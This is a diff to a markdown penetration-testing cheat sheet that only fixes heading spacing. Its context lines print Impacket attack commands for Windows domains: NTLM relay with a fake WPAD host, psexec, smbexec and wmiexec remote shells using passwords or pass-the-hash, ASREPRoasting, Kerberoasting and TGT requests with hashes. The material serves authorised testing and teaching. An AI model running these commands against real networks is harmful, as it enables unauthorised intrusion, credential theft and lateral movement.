@@ -1123,8 +1123,8 @@ ntlmrelayx.py -6 -t ldaps:// ip of domain controller -wh fakewpad.marvel.local -
  * set a listener on ldap port 389 with netcat or responder 
  * clear text passwords will be sent to you
 
-#Impacket
-##Obtain A Shell / Execute remote commands with a password
+# Impacket
+## Obtain A Shell / Execute remote commands with a password
 * psexec.py
 ```
 python psexec.py <domain_name>/<user_name>:<user_password>@<target_ip> 
@@ -1151,7 +1151,7 @@ python smbexec.py -hashes [lm_hash]:<ntlm_hash> <user_name>@<target_ip> cmd.exe
 python wmiexec.py -hashes [lm_hash]:<ntlm_hash> <user_name>@<target_ip> cmd.exe
 ```
 
-##ASREPRoast
+## ASREPRoast
 GetNPUsers.py
 * check ASREPRoast for all domain users (credentials required)
 ```
@@ -1161,12 +1161,12 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 ```
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -output <output file>
 ```
-##Kerberoasting
+## Kerberoasting
 GetUserSPNs.py
 ```
 python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -output <output file>
 ```
-##Over Pass The Hash / Pass The Key
+## Over Pass The Hash / Pass The Key
 * Request the TGT with hash 
 ```
 python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
